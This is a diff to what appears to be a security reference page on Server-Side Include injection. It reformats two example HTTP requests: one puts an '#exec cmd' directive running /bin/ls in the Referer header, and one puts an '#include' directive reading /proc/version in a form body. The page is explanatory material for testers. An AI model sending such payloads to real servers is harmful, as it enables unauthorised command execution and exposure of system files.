@@ -4,23 +4,22 @@ Exploiting SSI injection vulnerabilities often enables the injection of arbitrar
 
 SSI injection can have multiple injection points such as post forms, http headers, cookies..
 
-### Examples
-
-#### SSI
 
 - Code Execution:
 
-```http
-GET / HTTP/1.1
-Host: localhost
-Referer: <!--#exec cmd="/bin/ls"-->
-```
+=== SSI
+  ```http
+  GET / HTTP/1.1
+  Host: localhost
+  Referer: <!--#exec cmd="/bin/ls"-->
+  ```
 
 - File inclusion:
 
-```http
-POST /contact HTTP/1.1
-Host: localhost
-
-body=<!--#include virtual="/proc/version"-->
-```
+=== SSI
+  ```http
+  POST /contact HTTP/1.1
+  Host: localhost
+  
+  body=<!--#include virtual="/proc/version"-->
+  ```
